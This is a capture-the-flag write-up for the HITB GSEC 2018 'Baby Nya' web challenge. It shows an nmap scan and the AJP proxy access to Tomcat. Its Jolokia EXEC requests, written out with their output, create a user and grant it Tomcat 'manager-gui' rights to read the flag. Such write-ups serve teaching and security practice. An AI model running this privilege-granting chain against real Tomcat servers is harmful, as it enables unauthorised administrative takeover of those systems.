---
title: "HITB GSEC Qualifiers 2018 - Baby Nya (Web)"
header:
  overlay_image: /assets/images/hitbgsecquals2018/babynya/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Tina Rolf on Unsplash"
tags:
  - hitbgsecquals2018
  - writeup
  - web
---

An exposed Apache JServ Protocol server allows an attacker to proxy requests to
Tomcat server running Jolokia. The Jolokia instance allows the attacker to
create user accounts and grant manager rights.

## Challenge Description

```
Nya Nya Nya, target: 47.75.128.216
```

#### Points

588 Points

15 Solved

## Solution

First, we scan the target to find exposed ports.

```
nmap -p- -A 47.75.128.216

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-14 05:29 +08
Nmap scan report for 47.75.128.216
Host is up (0.044s latency).
Not shown: 65527 filtered ports
PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:1b:36:12:eb:cd:b3:f6:d5:b7:06:e0:7d:c9:61:00 (RSA)
|_  256 bf:76:6f:85:2a:c3:82:75:66:97:74:5e:c5:87:e2:42 (ECDSA)
80/tcp    closed http
443/tcp   closed https
2333/tcp  closed snapp
3389/tcp  closed ms-wbt-server
8009/tcp  open   ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods:
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
9999/tcp  open   http          nginx 1.10.3 (Ubuntu)
|_hadoop-datanode-info:
|_hadoop-jobtracker-info:
|_hadoop-tasktracker-info:
|_hbase-master-info:
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (application/octet-stream).
10250/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The interesting port here is 8009, the Apache JServ Protocol server. We used a
heavily customised version of https://github.com/hypn0s/AJPy to perform
queries. The AJP server acts as a binary protocol proxy to communicate with the
Tomcat server.

There is a hint given during the competition:

```
the tomcat deployed jolokia.war
```

We can make queries to this Jolokia web application.

```
$ python tomcat.py -t 47.75.128.216 req -m GET /jolokia | jq
{
  "request": {
    "type": "version"
  },
  "value": {
    "agent": "1.5.0",
    "protocol": "7.2",
    "config": {
      "listenForHttpService": "true",
      "maxCollectionSize": "0",
      "authIgnoreCerts": "false",
      "agentId": "local-23766-52c7cdf2-servlet",
      "agentType": "servlet",
      "policyLocation": "classpath:/jolokia-access.xml",
      "agentContext": "/jolokia",
      "mimeType": "text/plain",
      "discoveryEnabled": "false",
      "streaming": "true",
      "historyMaxEntries": "10",
      "allowDnsReverseLookup": "true",
      "maxObjects": "0",
      "debug": "false",
      "serializeException": "false",
      "detectorOptions": "{}",
      "dispatcherClasses": "org.jolokia.http.Jsr160ProxyNotEnabledByDefaultAnymoreDispatcher",
      "maxDepth": "15",
      "authMode": "basic",
      "canonicalNaming": "true",
      "allowErrorDetails": "true",
      "realm": "jolokia",
      "includeStackTrace": "true",
      "useRestrictorService": "false",
      "debugMaxEntries": "100"
    },
    "info": {
      "product": "tomcat",
      "vendor": "Apache",
      "version": "8.0.32"
    }
  },
  "timestamp": 1523655661,
  "status": 200
}
```

We can use Jolokia to create roles, a user, and add those roles to the newly
created user. The important role to assign is 'manager-gui' which will grant
Tomcat manager rights to the user.

First, creating a user:

```shell
$ python2 tomcat.py -t 47.75.128.216 req -m POST /jolokia --data '{
   "type":"EXEC", "mbean":"Users:database=UserDatabase,type=UserDatabase",
   "operation": "createUser", "arguments": ["greyhats", "greyhats", ""]
}' | jq
{
  "request": {
    "mbean": "Users:database=UserDatabase,type=UserDatabase",
    "arguments": [
      "greyhats",
      "greyhats",
      ""
    ],
    "type": "exec",
    "operation": "createUser"
  },
  "value": "Users:type=User,username=\"greyhats\",database=UserDatabase",
  "timestamp": 1523655958,
  "status": 200
}
```

Next, creating the role:

```shell
$ python2 tomcat.py -t 47.75.128.216 req -m POST /jolokia --data '{
   "type":"EXEC", "mbean":"Users:database=UserDatabase,type=UserDatabase",
   "operation": "createRole", "arguments": ["manager-gui", ""]
}'  | jq
{
  "request": {
    "mbean": "Users:database=UserDatabase,type=UserDatabase",
    "arguments": [
      "manager-gui",
      ""
    ],
    "type": "exec",
    "operation": "createRole"
  },
  "value": "Users:type=Role,rolename=\"manager-gui\",database=UserDatabase",
  "timestamp": 1523656029,
  "status": 200
}
```

Finally, adding the role:

```shell
python2 tomcat.py -t 47.75.128.216 req -m POST /jolokia --data '{
   "type":"EXEC", "mbean":"Users:database=UserDatabase,type=User,username=\"greyhats\"",
   "operation": "addRole", "arguments": ["manager-gui"]
}' | jq
{
  "request": {
    "mbean": "Users:database=UserDatabase,type=User,username=\"greyhats\"",
    "arguments": [
      "manager-gui"
    ],
    "type": "exec",
    "operation": "addRole"
  },
  "value": null,
  "timestamp": 1523656086,
  "status": 200
}
```

Now, we can login to the Tomcat Manager and grab the flag:

```
$ python2 tomcat.py -t 47.75.128.216 req -u greyhats -p greyhats -m GET /manager/html | grep HITB
 <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small>HITB{TOMCAT_TOMCAT_KAWAII}</small></td>
```

Flag: **HITB{TOMCAT\_TOMCAT\_KAWAII}**
